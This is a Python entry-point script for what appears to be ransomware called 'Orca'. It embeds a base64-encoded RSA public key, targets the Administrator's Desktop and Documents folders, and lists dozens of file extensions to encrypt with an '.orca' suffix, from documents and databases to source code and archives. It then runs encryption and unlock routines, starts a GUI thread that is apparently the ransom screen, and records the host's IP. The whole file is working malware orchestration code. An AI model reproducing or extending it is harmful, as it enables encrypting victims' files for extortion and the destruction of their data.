import base64
import threading
from scout import Scout
from orca import Orca
from face import Face
from birth import Birth

class Start:
    def __init__(self):
        sc = Scout()
        if sc.getBorn() == None:
            self.main()
            threading.Thread(target=self.face).start()
            threading.Thread(target=self.birth).start()
            sc.putBorn()
            sc.getIP()
        else:
            threading.Thread(target=self.face).start()
            threading.Thread(target=self.birth).start()

    def face(self):
        f = Face()
        f.mainloop()

    def birth(self):
        a = Birth()

    def main(self):
        orca = Orca(
            extension=".orca",
            env="sandbox",
            lroot=["C:\\Users\\Administrator\\Desktop","C:\\Users\\Administrator\\Documents"],
            public_key=base64.b64decode('LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE1SHllNWpvdUQ3Tm0wcjVRQ01COQppNFpwNDdPbE1QUm1hTytoT21kNFh4K1dSeVdCenRQK0MzcytneTVMNVhGQkgwa0tlUkhiNXBTZVh6QzNiaHU3CmdPeHA2T3o4cTFwLzB2djJsNkhacXRTZm0vTjgzYUptdlp5Z3V1U3Jhbll3WXBGaE1hYmd0aW9JUko3NnNEblUKUnJ5Z1NoTVpxMkhCRzU5bDRMK0pyZlAxUHZabXdIakpPeFZ1NXc4ZjMwakxxcHlIWXlobzExQWp0cDFOaWVSZQp2OTFOaG9CYmxqS3Z0QlgyTFZ4MjVWMUl0Wks5YnArSTNKMUN2cno0NHNYUVcxOHZ4SnZPbFRUK1g5U2JsUEVnCkxFUUYrOXhwU2lOb2w1QlFOcmZnbkJ4aWdxNXJsVS9DWDRIT3VkMUNudS9vYWY2OTJWOHdZQS9xVGxzLzdLclMKWVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==').decode("UTF-8"),
            egyptians=[
                #orca
                'orca',
                #text files
                'doc','docx','msg','odt','wpd','wps','txt',
                #data files
                'csv','pps','ppt','pptx','yml', 'yaml', 'json', 'xml',
                #audio files
                'aif','iif','m3u','m4a','mid','mp3','mpa','wav','wma',
                #video files
                '3gp','3g2','avi','mpeg','flv','m4v','mov','mp4','mpg','vob','wmv',
                #3d image files
                '3dm','3ds','max','obj','blend',
                #raster image
                'bmp','gif','png','jpeg','jpg','psd','tif','gif','ico','raw',
                #Vector image
                'ai','eps','ps','svg',
                #page layout
                'pdf','indd','pct','epub',
                #spreedsheet files
                'xls','xlr','xlsx',
                #database files
                'accdb','sqlite','sqlite3','dbf','mdb','pdb','sql','db',
                #game files
                'dem','gam','nes','rom','sav',
                #temp files
                'bkp','bak','tmp',
                #config files
                'cfg','conf','ini','prf',
                #source files
                'html','htm','xhtml','asp','aspx','jsp','php','js','c','cc','lua','go','java','css',
                #compressed formats
                'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
                #images
                'iso'
            ]
        )

        orca.nomad()
        orca.enc()
        threading.Thread(target=orca.unlock).start()




if __name__ == "__main__":
    s = Start()